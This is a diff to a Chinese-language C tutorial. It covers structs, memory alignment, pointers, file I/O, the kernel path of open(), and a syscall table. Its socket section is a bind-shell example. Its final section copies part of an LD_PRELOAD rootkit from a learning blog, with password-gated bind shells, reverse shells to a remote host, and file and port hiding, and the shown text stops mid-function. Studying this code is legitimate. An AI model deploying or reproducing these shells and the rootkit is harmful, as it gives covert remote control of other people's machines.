@@ -8,6 +8,32 @@
   - [重定向](#重定向)
   - [拓展模式](#拓展模式)
 - [宏定义](#宏定义)
+- [运算符](#运算符)
+- [条件语句`if`](#条件语句if)
+- [main函数参数](#main函数参数)
+- [数组](#数组)
+- [malloc和free](#malloc和free)
+  - [malloc/free源码分析](#mallocfree源码分析)
+- [srand/rand随机](#srandrand随机)
+- [for循环](#for循环)
+- [引用与指针](#引用与指针)
+- [数组](#数组-1)
+- [函数调用](#函数调用)
+- [char数组](#char数组)
+- [malloc](#malloc)
+- [struct结构体](#struct结构体)
+- [结构体引用结构体](#结构体引用结构体)
+- [结构体数组](#结构体数组)
+- [指针操作](#指针操作)
+- [文件操作](#文件操作)
+- [Syacall](#syacall)
+  - [意义](#意义)
+  - [Syscall对照表](#syscall对照表)
+  - [syscall原理](#syscall原理)
+- [socket](#socket)
+- [dl动态库操作-dlsym](#dl动态库操作-dlsym)
+- [后记](#后记)
+
 
 
 ## helloworld
@@ -1860,6 +1886,1044 @@ $3 = 12                             # 长度为 4 + 4 + 4
 $4 = 8                              # 指针的大小为8
 ```
 
-[:books: 返回目录](#目录)
+```sh
+-exec x/4xw 0x555555558018
+#                                   50          'W'       3.14  
+0x555555558018 <example>:	0x00000032	0x00000057	0x4048f5c3	0x00000000
+```
+
+> char这里占用4个字节，单独申请的话，是一个字节。  
+
+内存对齐主要遵循下面三个原则:  
+- 结构体变量的起始地址能够被其最宽的成员大小整除
+- 结构体每个成员相对于起始地址的偏移能够被其自身大小整除，如果不能则在前一个成员后面补充字节
+- 结构体总体大小能够被最宽的成员的大小整除，如不能则在后面补充字  
+
+这个其实是编译器做的事情，这样访问的效率更高，但是会有空间的浪费。  
 
 
+
+[:books: 返回目录](#目录)  
+
+## 结构体引用结构体   
+
+```c
+#include <stdio.h>
+#include <string.h>
+
+struct data {
+	char first[20];
+	char last[20];
+	int employee_id;
+	int last_4_SSN;
+	char title[20];
+};
+
+struct employees {
+	struct data employee1;
+	struct data employee2;
+} engineering_dept;
+
+int main(void)
+{
+	//scanf the input into the correct variable
+	//engineering_dept = name of the instance of the 'employees' struct
+	//employee1 = member of the 'employees' struct
+	//first = member of the 'data' struct
+	//notice that employee1 and employee2 are 'data' struct instances themselves
+	for(int i = 0; i < 2; i++) {
+		struct data *employee = &engineering_dept.employee1;
+		if(i > 0)
+			employee = &engineering_dept.employee2;
+
+		printf("Enter the employee's first name: ");
+		scanf("%s", &employee->first);
+
+		printf("Enter the employee's last name: ");
+		scanf("%s", &employee->last);
+
+		printf("Enter the employee's ID number: ");
+		scanf("%d", &employee->employee_id);
+
+		printf("Enter the last four digits of the employee's SSN: ");
+		scanf("%d", &employee->last_4_SSN);
+
+		printf("Enter the employee's job title (do not include the word \'Engineer\'): ");
+		scanf("%s", &employee->title);
+
+		puts("");
+	}
+
+	//print all the info we just stored for each employee
+	for(int i = 0; i < 2; i++) {
+		struct data *employee = &engineering_dept.employee1;
+		if(i > 0)
+			employee = &engineering_dept.employee2;
+
+		printf("\nEmployee information for %s %s: ", employee->first, employee->last);
+		printf("\nID: %d", employee->employee_id);
+		printf("\nSSN: %d", employee->last_4_SSN);
+		printf("\nTitle: %s Engineer\n", employee->title);
+	}
+
+	return 0;
+}
+```
+
+输入与输出  
+```
+Enter the employee's first name: tian
+Enter the employee's last name: ze
+Enter the employee's ID number: 1
+Enter the last four digits of the employee's SSN: Engineer 1
+Enter the employee's job title (do not include the word 'Engineer'): 
+
+Employee information for tian ze: 
+ID: 1
+SSN: 0
+Title: Engineer Engineer
+```
+
+反汇编内容
+```sh
+25      struct data *employee = &engineering_dept.employee1; # struct data employee1; 存储的是值，全是栈的，
+   0x00005555555551a1 <+24>:  lea    rax,[rip+0x2e98]        # 0x555555558040 <engineering_dept>
+   0x00005555555551a8 <+31>:  mov    QWORD PTR [rbp-0x10],rax
+
+27        employee = &engineering_dept.employee2;            # 结构体占用68字节，所以偏移量是68  
+   0x00005555555551b2 <+41>:  lea    rax,[rip+0x2ecb]        # 0x555555558084 <engineering_dept+68> 
+   0x00005555555551b9 <+48>:  mov    QWORD PTR [rbp-0x10],rax
+
+30      scanf("%s", &employee->first);
+   0x00005555555551ce <+69>:  mov    rax,QWORD PTR [rbp-0x10]
+   0x00005555555551d2 <+73>:  mov    rsi,rax
+   0x00005555555551d5 <+76>:  lea    rdi,[rip+0xe4e]        # 0x55555555602a
+   0x00005555555551dc <+83>:  mov    eax,0x0
+   0x00005555555551e1 <+88>:  call   0x555555555090 <__isoc99_scanf@plt>
+
+31  
+32      printf("Enter the employee's last name: ");
+   0x00005555555551e6 <+93>:  lea    rdi,[rip+0xe43]        # 0x555555556030
+   0x00005555555551ed <+100>: mov    eax,0x0
+   0x00005555555551f2 <+105>: call   0x555555555080 <printf@plt>
+
+33      scanf("%s", &employee->last);
+   0x00005555555551f7 <+110>: mov    rax,QWORD PTR [rbp-0x10]
+   0x00005555555551fb <+114>: add    rax,0x14               # 偏移量为20  
+   0x00005555555551ff <+118>: mov    rsi,rax
+   0x0000555555555202 <+121>: lea    rdi,[rip+0xe21]        # 0x55555555602a
+   0x0000555555555209 <+128>: mov    eax,0x0
+   0x000055555555520e <+133>: call   0x555555555090 <__isoc99_scanf@plt>
+```
+
+
+[:books: 返回目录](#目录)  
+
+## 结构体数组 
+
+```c
+#include <stdio.h>
+
+//define stats struct
+struct stats {
+	int points;
+	int games;
+};
+
+//create instance of 5 players stats structs
+struct stats players[5];
+
+int counter;
+
+int main (void)
+{
+	//loop through getting input for both stats members for each stats players struct
+	for (counter = 0; counter < 5; counter++)
+	{
+		printf("Enter Player %d's point total: ", (counter + 1));
+		scanf("%d", &players[counter].points);
+
+		printf("Enter Player %d's game total: ", (counter + 1));
+		scanf("%d", &players[counter].games);
+	}
+
+	printf("\n");
+	
+	//you know this by now, you're a C god
+	for (counter = 0; counter < 5; counter++)
+	{
+		float average = (float)(players[counter].points)/(players[counter].games);
+
+		printf("Player %d's scoring average was %.2f ppg.\n", (counter + 1), average);
+	}
+	
+	return 0;
+}
+```
+
+输出:
+```sh
+Enter Player 1's point total: 9
+Enter Player 1's game total: 13
+Enter Player 2's point total: 12
+Enter Player 2's game total: 3
+Enter Player 3's point total: 1
+Enter Player 3's game total: 4
+Enter Player 4's point total: 3
+Enter Player 4's game total: 2
+Enter Player 5's point total: 1
+Enter Player 5's game total: 4
+
+Player 1's scoring average was 0.69 ppg.
+Player 2's scoring average was 4.00 ppg.
+Player 3's scoring average was 0.25 ppg.
+Player 4's scoring average was 1.50 ppg.
+Player 5's scoring average was 0.25 ppg.
+```
+
+反汇编内容:  
+```sh
+16    //loop through getting input for both stats members for each stats players struct
+17    for (counter = 0; counter < 5; counter++)
+   0x0000555555555195 <+12>:  mov    DWORD PTR [rip+0x2ec9],0x0        # 0x555555558068 <counter>   # counter = 0;
+   0x000055555555519f <+22>:  jmp    0x55555555524b <main+194>
+   0x000055555555523c <+179>: mov    eax,DWORD PTR [rip+0x2e26]        # 0x555555558068 <counter>   # rip 动态变化的 
+   0x0000555555555242 <+185>: add    eax,0x1
+   0x0000555555555245 <+188>: mov    DWORD PTR [rip+0x2e1d],eax        # 0x555555558068 <counter>
+   0x000055555555524b <+194>: mov    eax,DWORD PTR [rip+0x2e17]        # 0x555555558068 <counter>
+   0x0000555555555251 <+200>: cmp    eax,0x4
+   0x0000555555555254 <+203>: jle    0x5555555551a4 <main+27>
+
+18    {
+19       printf("Enter Player %d's point total: ", (counter + 1));
+   0x00005555555551a4 <+27>:  mov    eax,DWORD PTR [rip+0x2ebe]        # 0x555555558068 <counter>
+   0x00005555555551aa <+33>:  add    eax,0x1                           # counter + 1
+   0x00005555555551ad <+36>:  mov    esi,eax
+   0x00005555555551af <+38>:  lea    rdi,[rip+0xe52]        # 0x555555556008
+   0x00005555555551b6 <+45>:  mov    eax,0x0
+   0x00005555555551bb <+50>:  call   0x555555555080 <printf@plt>
+
+20       scanf("%d", &players[counter].points);
+   0x00005555555551c0 <+55>:  mov    eax,DWORD PTR [rip+0x2ea2]        # 0x555555558068 <counter>  读取counter的值
+   0x00005555555551c6 <+61>:  cdqe   
+   0x00005555555551c8 <+63>:  lea    rdx,[rax*8+0x0]         # counter x 8 , 也就是偏移8字节， 每次偏移8个字节  
+   0x00005555555551d0 <+71>:  lea    rax,[rip+0x2e69]        # 0x555555558040 <players>
+   0x00005555555551d7 <+78>:  add    rax,rdx                 # players[counter].points = players_addr + counter * 8 + 0
+   0x00005555555551da <+81>:  mov    rsi,rax
+   0x00005555555551dd <+84>:  lea    rdi,[rip+0xe44]        # 0x555555556028
+   0x00005555555551e4 <+91>:  mov    eax,0x0
+   0x00005555555551e9 <+96>:  call   0x555555555090 <__isoc99_scanf@plt>
+```
+
+[:books: 返回目录](#目录)  
+
+
+## 指针操作
+
+```c
+#include <stdio.h>
+
+struct example {
+	int integer;
+};
+
+int main (void)
+{
+	struct example *ptr;
+	struct example test;
+
+	ptr = &test;
+
+	test.integer = 5;
+	printf("%d\n", test.integer);
+
+	(*ptr).integer = 6;
+	printf("%d\n", test.integer);
+
+	ptr->integer = 7;
+	printf("%d\n", test.integer);
+
+	return 0;
+}
+```
+
+输出
+```sh
+5
+6
+7
+```
+
+反汇编结果
+```sh
+9     struct example *ptr;
+10    struct example test;
+11 
+12    ptr = &test;
+   0x0000555555555184 <+27>:  lea    rax,[rbp-0x14]                    # [rbp-0x14] 是 test 变量的地址， 把test的地址存储到ptr变量中  
+   0x0000555555555188 <+31>:  mov    QWORD PTR [rbp-0x10],rax
+
+13 
+14    test.integer = 5;
+   0x000055555555518c <+35>:  mov    DWORD PTR [rbp-0x14],0x5
+
+16 
+17    (*ptr).integer = 6;
+   0x00005555555551a9 <+64>:  mov    rax,QWORD PTR [rbp-0x10]         # (*ptr) 相当于去除指针指向的地址，也就是test变量的地址  
+   0x00005555555551ad <+68>:  mov    DWORD PTR [rax],0x6
+
+19 
+20    ptr->integer = 7;
+   0x00005555555551c9 <+96>:  mov    rax,QWORD PTR [rbp-0x10]         # ptr->integer 就是相当于对指向的内容进行操作  
+   0x00005555555551cd <+100>: mov    DWORD PTR [rax],0x7
+```
+
+[:books: 返回目录](#目录)  
+
+
+## 文件操作  
+
+```c
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+
+int main (void)
+{
+	int filedescriptor;
+
+	filedescriptor = open("testfile.txt", O_WRONLY | O_CREAT, S_IRWXU);
+
+	if (filedescriptor < 0)
+	{
+		printf("The open operation failed...");
+		return -1;
+	}
+	else 
+	{
+		printf("The open operation succeeded!\n");
+		
+	}
+
+	int writertn;
+
+	writertn = write(filedescriptor, "Writing test data to the file", 30);
+
+	if (writertn != 30)
+	{
+		printf("The write operation failed...");
+		return -1;
+	}
+	else
+	{
+		printf("The write operation succeeded!");
+	}
+
+	if (close(filedescriptor) != 0)
+	{
+		printf("The close operation failed...");
+		return -1;
+	}
+
+	return 0;
+
+}
+```
+
+反汇编内容  
+```sh
+7     int filedescriptor;
+8  
+9     filedescriptor = open("testfile.txt", O_WRONLY | O_CREAT, S_IRWXU);
+   0x00005555555551d5 <+12>:  mov    edx,0x1c0
+   0x00005555555551da <+17>:  mov    esi,0x41
+   0x00005555555551df <+22>:  lea    rdi,[rip+0xe22]        # 0x555555556008
+   0x00005555555551e6 <+29>:  mov    eax,0x0
+   0x00005555555551eb <+34>:  call   0x5555555550d0 <open@plt>
+   0x00005555555551f0 <+39>:  mov    DWORD PTR [rbp-0x8],eax
+
+10 
+11    if (filedescriptor < 0)
+   0x00005555555551f3 <+42>:  cmp    DWORD PTR [rbp-0x8],0x0
+   0x00005555555551f7 <+46>:  jns    0x555555555211 <main+72>
+
+12    {
+13       printf("The open operation failed...");
+   0x00005555555551f9 <+48>:  lea    rdi,[rip+0xe15]        # 0x555555556015
+   0x0000555555555200 <+55>:  mov    eax,0x0
+   0x0000555555555205 <+60>:  call   0x5555555550b0 <printf@plt>
+
+14       return -1;
+   0x000055555555520a <+65>:  mov    eax,0xffffffff
+   0x000055555555520f <+70>:  jmp    0x555555555290 <main+199>
+
+15    }
+```
+
+`open`源码分析`glibc-2.31/sysdeps/unix/sysv/linux/open64.c:37`  
+```c
+/* Open FILE with access OFLAG.  If O_CREAT or O_TMPFILE is in OFLAG,
+   a third argument is the file protection.  */
+int
+__libc_open64 (const char *file, int oflag, ...)
+{
+  int mode = 0;
+
+  if (__OPEN_NEEDS_MODE (oflag))
+    {
+      va_list arg;
+      va_start (arg, oflag);
+      mode = va_arg (arg, int);
+      va_end (arg);
+    }
+
+  return SYSCALL_CANCEL (openat, AT_FDCWD, file, oflag | EXTRA_OPEN_FLAGS,
+                         mode);
+}
+```
+
+在网上看`open`的源码分析的函数为`do_sys_open`, 在gdb中设置，但是无法加载，断点也是`pending`的  
+```sh
+(gdb) b do_sys_open
+Function "do_sys_open" not defined.
+Make breakpoint pending on future shared library load? (y or [n]) y
+Breakpoint 3 (do_sys_open) pending.
+(gdb) info b
+Num     Type           Disp Enb Address            What
+1       breakpoint     keep y   0x00005555555551c9 in main at /root/work/c-cpp-cookbook/code/test/main.c:6
+        breakpoint already hit 1 time
+2       breakpoint     keep y   0x00005555555551d5 in main at /root/work/c-cpp-cookbook/code/test/main.c:9
+        breakpoint already hit 1 time
+3       breakpoint     keep y   <PENDING>          do_sys_open
+```
+
+查看`do_sys_open` 函数  
+```sh
+ldd main
+	linux-vdso.so.1 (0x00007ffe62390000)
+	/usr/local/glibc/lib/libc-2.31.so (0x00007f90e198a000)
+	/usr/local/glibc/lib/ld-2.31.so => /lib64/ld-linux-x86-64.so.2 (0x00007f90e1b61000)
+```
+
+发现`/usr/local/glibc/lib/libc-2.31.so`不包含`do_sys_open`,`SYSCALL_DEFINE3(open, const char __user *, filename, int, flags, umode_t, mode)`的实现是`do_sys_open`  
+
+相信熟悉系统调用的都知道，系统调用在内核中的入口都是`sys_xxx`，我也不例外，记得有一次，我抱着学习一下socket内核实现的心态想在内核中寻找sys_socket系统调用，却发现只能找到宏定义，怎么也找不到函数实现。后来经过查阅才知道，原来Linux的系统调用都改为`SYSCALL_DEFINE`定义的了。相信大家都很疑惑，原来的sys_xxx不是挺好的吗？为什么要定义成SYSCALL_DEFINE呢？我也很疑惑，所以我看了一下SYSCALL_DEFINE的定义，如下:  
+
+```c
+#define SYSCALL_DEFINE0(name)	   asmlinkage long sys_##name(void)
+#define SYSCALL_DEFINE1(name, ...) SYSCALL_DEFINEx(1, _##name, __VA_ARGS__)
+#define SYSCALL_DEFINE2(name, ...) SYSCALL_DEFINEx(2, _##name, __VA_ARGS__)
+#define SYSCALL_DEFINE3(name, ...) SYSCALL_DEFINEx(3, _##name, __VA_ARGS__)
+#define SYSCALL_DEFINE4(name, ...) SYSCALL_DEFINEx(4, _##name, __VA_ARGS__)
+#define SYSCALL_DEFINE5(name, ...) SYSCALL_DEFINEx(5, _##name, __VA_ARGS__)
+#define SYSCALL_DEFINE6(name, ...) SYSCALL_DEFINEx(6, _##name, __VA_ARGS__)
+
+#define SYSCALL_DEFINEx(x, name, ...)					\
+	asmlinkage long sys##name(__SC_DECL##x(__VA_ARGS__));		\
+	static inline long SYSC##name(__SC_DECL##x(__VA_ARGS__));	\
+	asmlinkage long SyS##name(__SC_LONG##x(__VA_ARGS__))		\
+	{								\
+		__SC_TEST##x(__VA_ARGS__);				\
+		return (long) SYSC##name(__SC_CAST##x(__VA_ARGS__));	\
+	}								\
+	SYSCALL_ALIAS(sys##name, SyS##name);				\
+	static inline long SYSC##name(__SC_DECL##x(__VA_ARGS__))
+```
+
+我们就拿socket来举例，`SYSCALL_DEFINEx`里面的x代表的是系统调用参数个数。sys_socket的宏定义为：  
+
+asmlinkage long sys_socket(int, int, int);那么可以看出来对应的应该是SYSCALL_DEFINE3。到socket.c里面找到socket的定义如下：  
+
+```c
+SYSCALL_DEFINE3(socket, int, family, int, type, int, protocol)
+```
+
+首先##是连接符，__VA_ARGS__代表前面...里面的可变参数，也就是说展开后结果为  
+```c
+SYSCALL_DEFINEx(3, _socket,  int, family, int, type, int, protocol)
+```
+
+那么再将上面的展开，结果如下：  
+
+```c
+	asmlinkage long sys_socket(__SC_DECL3(int, family, int, type, int, protocol));		\
+	static inline long SYSC_socket(__SC_DECL3(int, family, int, type, int, protocol));	\
+	asmlinkage long SyS_socket(__SC_LONG3(int, family, int, type, int, protocol))		\
+	{								\
+		__SC_TEST3(int, family, int, type, int, protocol);				\
+		return (long) SYSC_socket(__SC_CAST3(int, family, int, type, int, protocol));	\
+	}								\
+	SYSCALL_ALIAS(sys_socket, SyS_socket);				\
+	static inline long SYSC_sockt(__SC_DECL3(int, family, int, type, int, protocol))
+```
+
+最终变成
+```c
+asmlinkage long sys_socket(int family, int type, int protocol);		\
+	static inline long SYSC_socket(int family, int type, int protocol );	\
+	asmlinkage long SyS_socket(long family, long type, long protocol)		\
+	{								\
+		BUILD_BUG_ON(sizeof(int) > sizeof(long)); BUILD_BUG_ON(sizeof(int) > sizeof(long));			\
+		return (long) SYSC_socket((int) family, (int) type, (int) protocol);	\
+	}								\
+	SYSCALL_ALIAS(sys_socket, SyS_socket);				\
+```
+
+大家这下总算看明白了吧，其实里面做的工作，就是将系统调用的参数统一变为了使用long型来接收，再强转转为int，也就是系统调用本来传下来的参数类型。那么这么强转一下究竟是为什么呢？原因就是64位的Linux有一个名为`CVE-2009-2009`的漏洞  
+
+
+这就需要查看内核代码了.  
+`/usr/src/linux-source-5.4.0/fs/open.c`中找到了 
+```c
+SYSCALL_DEFINE3(open, const char __user *, filename, int, flags, umode_t, mode)
+{
+	if (force_o_largefile())
+		flags |= O_LARGEFILE;
+
+	return do_sys_open(AT_FDCWD, filename, flags, mode);
+}
+```
+
+```c
+long do_sys_open(int dfd, const char __user *filename, int flags, umode_t mode)
+{
+	struct open_flags op;
+	int fd = build_open_flags(flags, mode, &op);
+	struct filename *tmp;
+
+	if (fd)
+		return fd;
+
+	tmp = getname(filename);
+	if (IS_ERR(tmp))
+		return PTR_ERR(tmp);
+
+	fd = get_unused_fd_flags(flags);
+	if (fd >= 0) {
+		struct file *f = do_filp_open(dfd, tmp, &op);
+		if (IS_ERR(f)) {
+			put_unused_fd(fd);
+			fd = PTR_ERR(f);
+		} else {
+			fsnotify_open(f);
+			fd_install(fd, f);
+			trace_do_sys_open(tmp->name, flags, mode);
+		}
+	}
+	putname(tmp);
+	return fd;
+}
+```
+
+
+
+[:books: 返回目录](#目录)  
+
+
+## Syacall  
+### 意义
+内核提供用户空间程序与内核空间进行交互的一套标准接口，这些接口让用户态程序能受限访问硬件设备，比如申请系统资源，操作设备读写，创建新进程等。用户空间发生请求，内核空间负责执行，这些接口便是用户空间和内核空间共同识别的桥梁，这里提到两个字“受限”，是由于为了保证内核稳定性，而不能让用户空间程序随意更改系统，必须是内核对外开放的且满足权限的程序才能调用相应接口。
+
+在用户空间和内核空间之间，有一个叫做`Syscall`(系统调用, system call)的中间层，是连接用户态和内核态的桥梁。这样即提高了内核的安全型，也便于移植，只需实现同一套接口即可。Linux系统，用户空间通过向内核空间发出Syscall，产生软中断，从而让程序陷入内核态，执行相应的操作。对于每个系统调用都会有一个对应的系统调用号，比很多操作系统要少很多。  
+
+### Syscall对照表  
+| 名称 | 系统调用号 | 头文 | 内核实现 |
+| --- | --------- | --- | ------- | 
+| read | 0 | unistd.h | fs/read_write.c | 
+| write | 1 | unistd.h | fs/read_write.c | 
+| open | 2 | fcntl.h | fs/open.c | 
+| close | 3 | unistd.h | fs/open.c | 
+| stat | 4 | sys/stat.h | fs/stat.c | 
+| fstat | 5 | sys/stat.h | fs/stat.c | 
+| lstat | 6 | sys/stat.h | fs/stat.c | 
+| poll | 7 | poll.h | fs/select.c | 
+| lseek | 8 | unistd.h | fs/read_write.c | 
+| mmap | 9 | sys/mman.h | arch/x86/kernel/sys_x86_64.c | 
+| munmap | 11 | sys/mman.h | mm/mmap.c | 
+| pread64 | 17 | unistd.h | fs/read_write.c | 
+| pwrite64 | 18 | unistd.h | fs/read_write.c | 
+| readv | 19 | sys/uio.h | fs/read_write.c | 
+| writev | 20 | sys/uio.h | fs/read_write.c | 
+| select | 23 | sys/select.h | fs/select.c | 
+| mremap | 25 | sys/mman.h | mm/mremap.c | 
+| msync | 26 | sys/mman.h | mm/msync.c | 
+| epoll_create | 213 | sys/epoll.h | fs/eventpoll.c | 
+| remap_file_pages | 216 | sys/mman.h | mm/mmap.c | 
+| epoll_ctl | 232 | sys/epoll.h | fs/eventpoll.c | 
+| epoll_wait | 233 | sys/epoll.h | fs/eventpoll.c | 
+| openat | 257 | fcntl.h | fs/open.c | 
+| newfstatat | 262 | sys/stat.h | fs/stat.c | 
+| pselect6 | 270 | sys/select.h | fs/select.c | 
+| ppoll | 271 | poll.h | fs/select.c | 
+| epoll_pwait | 281 | sys/epoll.h | fs/eventpoll.c | 
+| eventfd | 284 | sys/eventfd.h | fs/eventfd.c | 
+| eventfd2 | 290 | sys/eventfd.h | fs/eventfd.c | 
+| epoll_create1 | 291 | sys/epoll.h | fs/eventpoll.c | 
+| preadv | 295 | sys/uio.h | fs/read_write.c | 
+| pwritev | 296 | sys/uio.h | fs/read_write.c | 
+| name_to_handle_at | 303 | fcntl.h | fs/fhandle.c | 
+| open_by_handle_at | 304 | fcntl.h | fs/fhandle.c | 
+| preadv2 | 327 | sys/uio.h | fs/read_write.c | 
+| pwritev2 | 328 | sys/uio.h | fs/read_write.c | 
+| statx | 332 | linux/stat.h | fs/stat.c | 
+| open_tree | 428 | 无 | fs/namespace.c | 
+
+### syscall原理  
+
+[:books: 返回目录](#目录)  
+
+
+## socket 
+
+```c
+#include <stdio.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+
+int main(void) {
+
+    //creating variable listen_sock which is returned by socket() as we need it for the bind(), listen(), and accept() calls 
+    int listen_sock = socket(AF_INET, SOCK_STREAM, 0);
+
+    // Building a 'struct' which consists of AF_INET, the interface we want to listen on (all), and a port number to bind on. This entire entity will be referenced in arguments for the next syscall: bind()    
+    struct sockaddr_in server_addr;
+    server_addr.sin_family = AF_INET;           
+    server_addr.sin_addr.s_addr = INADDR_ANY;  
+    server_addr.sin_port = htons(5555);        
+
+    // Our second syscall, and perhaps the most complicated: bind() 
+    bind(listen_sock, (struct sockaddr *)&server_addr, sizeof(server_addr));
+
+    //0 here is our specified backlog, (we dont have one)
+    listen(listen_sock, 0);
+
+    //creating new var conn_sock which is returned from accept() and needed for the dup2() call which duplicates this for stdin, stdout, and stderr
+    int conn_sock = accept(listen_sock, NULL, NULL);
+
+    // Our fifth syscall, dup2(), is used 3 times
+    dup2(conn_sock, 0);
+    dup2(conn_sock, 1);
+    dup2(conn_sock, 2);
+
+    // Our final syscall is execve(), which runs a program fed to it as a string
+    execve("/bin/sh", NULL, NULL);
+}
+```
+
+反汇编内容 
+```sh
+6  
+7      //creating variable listen_sock which is returned by socket() as we need it for the bind(), listen(), and accept() calls 
+8      int listen_sock = socket(AF_INET, SOCK_STREAM, 0);
+=> 0x0000555555555244 <+27>:  mov    edx,0x0
+   0x0000555555555249 <+32>:  mov    esi,0x1
+   0x000055555555524e <+37>:  mov    edi,0x2
+   0x0000555555555253 <+42>:  call   0x555555555130 <socket@plt>
+   0x0000555555555258 <+47>:  mov    DWORD PTR [rbp-0x28],eax
+
+9  
+10     // Building a 'struct' which consists of AF_INET, the interface we want to listen on (all), and a port number to bind on. This entire entity will be referenced in arguments for the next syscall: bind()    
+11     struct sockaddr_in server_addr;
+12     server_addr.sin_family = AF_INET;           
+   0x000055555555525b <+50>:  mov    WORD PTR [rbp-0x20],0x2
+
+13     server_addr.sin_addr.s_addr = INADDR_ANY;  
+   0x0000555555555261 <+56>:  mov    DWORD PTR [rbp-0x1c],0x0
+
+14     server_addr.sin_port = htons(5555);        
+   0x0000555555555268 <+63>:  mov    edi,0x15b3
+   0x000055555555526d <+68>:  call   0x5555555550d0 <htons@plt>
+   0x0000555555555272 <+73>:  mov    WORD PTR [rbp-0x1e],ax
+
+15 
+16     // Our second syscall, and perhaps the most complicated: bind() 
+17     bind(listen_sock, (struct sockaddr *)&server_addr, sizeof(server_addr));
+   0x0000555555555276 <+77>:  lea    rcx,[rbp-0x20]
+   0x000055555555527a <+81>:  mov    eax,DWORD PTR [rbp-0x28]
+   0x000055555555527d <+84>:  mov    edx,0x10
+   0x0000555555555282 <+89>:  mov    rsi,rcx
+   0x0000555555555285 <+92>:  mov    edi,eax
+   0x0000555555555287 <+94>:  call   0x555555555110 <bind@plt>
+
+18 
+19     //0 here is our specified backlog, (we dont have one)
+20     listen(listen_sock, 0);
+   0x000055555555528c <+99>:  mov    eax,DWORD PTR [rbp-0x28]
+   0x000055555555528f <+102>: mov    esi,0x0
+   0x0000555555555294 <+107>: mov    edi,eax
+   0x0000555555555296 <+109>: call   0x555555555100 <listen@plt>
+```
+
+[:books: 返回目录](#目录)  
+
+## dl动态库操作-dlsym
+```c
+#include <stdio.h>
+#include <unistd.h>
+#include <dlfcn.h>
+#include <string.h>
+
+ssize_t write(int fildes, const void *buf, size_t nbytes)
+{
+	ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes);
+
+	ssize_t result;
+
+	new_write = dlsym(RTLD_NEXT, "write");
+
+	if (strcmp(buf, "Hello, World!") == 0)
+	{
+		result = new_write(fildes, "Goodbye, cruel world!", 21);
+	}
+
+	else
+	{
+		result = new_write(fildes, buf, nbytes);
+	}
+
+	return result;
+}
+```
+
+`man dlopen`
+```c
+#include <dlfcn.h>
+
+void *dlopen(const char *filename, int flag);
+
+char *dlerror(void);
+
+void *dlsym(void *handle, const char *symbol);
+
+int dlclose(void *handle);
+```
+
+dlopen以指定模式打开指定的动态连接库文件，并返回一个句柄给调用进程，dlerror返回出现的错误，dlsym通过句柄和连接符名称获取函数名或者变量名，dlclose来卸载打开的库。  
+
+
+
+
+## 后记  
+https://h0mbre.github.io/Learn-C-By-Creating-A-Rootkit/#  
+
+```c
+#include <stdio.h>
+#include <unistd.h>
+#include <dlfcn.h>
+#include <string.h>
+#include <fcntl.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <dlfcn.h>
+#include <dirent.h>
+#include <arpa/inet.h>
+//bind-shell definitions
+#define KEY_4 "notavaliduser4"
+#define KEY_6 "notavaliduser6"
+#define PASS "areallysecurepassword1234!@#$"
+#define LOC_PORT 65065
+//reverse-shell definitions
+#define KEY_R_4 "reverseshell4"
+#define KEY_R_6 "reverseshell6"
+#define REM_HOST4 "127.0.0.1"
+#define REM_HOST6 "::1"
+#define REM_PORT 443
+//filename to hide
+#define FILENAME "ld.so.preload"
+//hex represenation of port to hide for /proc/net/tcp reads
+#define KEY_PORT "FE29"
+
+int ipv6_bind (void)
+{
+    struct sockaddr_in6 addr;
+    addr.sin6_family = AF_INET6;
+    addr.sin6_port = htons(LOC_PORT);
+    addr.sin6_addr = in6addr_any;
+
+    int sockfd = socket(AF_INET6, SOCK_STREAM, 0);
+
+    const static int optval = 1;
+
+    setsockopt(sockfd, IPPROTO_IPV6, IPV6_V6ONLY, &optval, sizeof(optval));
+
+    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
+
+    bind(sockfd, (struct sockaddr*) &addr, sizeof(addr));
+
+    listen(sockfd, 0);
+
+    int new_sockfd = accept(sockfd, NULL, NULL);
+
+    for (int count = 0; count < 3; count++)
+    {
+        dup2(new_sockfd, count);
+    }
+
+    char input[30];
+
+    read(new_sockfd, input, sizeof(input));
+    input[strcspn(input, "\n")] = 0;
+    if (strcmp(input, PASS) == 0)
+    {
+        execve("/bin/sh", NULL, NULL);
+        close(sockfd);
+    }
+    else 
+    {
+        shutdown(new_sockfd, SHUT_RDWR);
+        close(sockfd);
+    }
+    
+}
+
+int ipv4_bind (void)
+{
+    struct sockaddr_in addr;
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(LOC_PORT);
+    addr.sin_addr.s_addr = INADDR_ANY;
+
+    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+
+    const static int optval = 1;
+
+    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
+
+    bind(sockfd, (struct sockaddr*) &addr, sizeof(addr));
+
+    listen(sockfd, 0);
+
+    int new_sockfd = accept(sockfd, NULL, NULL);
+
+    for (int count = 0; count < 3; count++)
+    {
+        dup2(new_sockfd, count);
+    }
+
+    char input[30];
+
+    read(new_sockfd, input, sizeof(input));
+    input[strcspn(input, "\n")] = 0;
+    if (strcmp(input, PASS) == 0)
+    {
+        execve("/bin/sh", NULL, NULL);
+        close(sockfd);
+    }
+    else 
+    {
+        shutdown(new_sockfd, SHUT_RDWR);
+        close(sockfd);
+    }
+    
+}
+
+int ipv6_rev (void)
+{
+    const char* host = REM_HOST6;
+
+    struct sockaddr_in6 addr;
+    addr.sin6_family = AF_INET6;
+    addr.sin6_port = htons(REM_PORT);
+    inet_pton(AF_INET6, host, &addr.sin6_addr);
+
+    struct sockaddr_in6 client;
+    client.sin6_family = AF_INET6;
+    client.sin6_port = htons(LOC_PORT);
+    client.sin6_addr = in6addr_any;
+
+    int sockfd = socket(AF_INET6, SOCK_STREAM, 0);
+
+    bind(sockfd, (struct sockaddr*) &client, sizeof(client));
+
+    connect(sockfd, (struct sockaddr*) &addr, sizeof(addr));
+
+    for (int count = 0; count < 3; count++)
+    {
+        dup2(sockfd, count);
+    }
+
+    execve("/bin/sh", NULL, NULL);
+    close(sockfd);
+
+    return 0;
+}
+
+int ipv4_rev (void)
+{
+    const char* host = REM_HOST4;
+
+    struct sockaddr_in addr;
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(REM_PORT);
+    inet_aton(host, &addr.sin_addr);
+
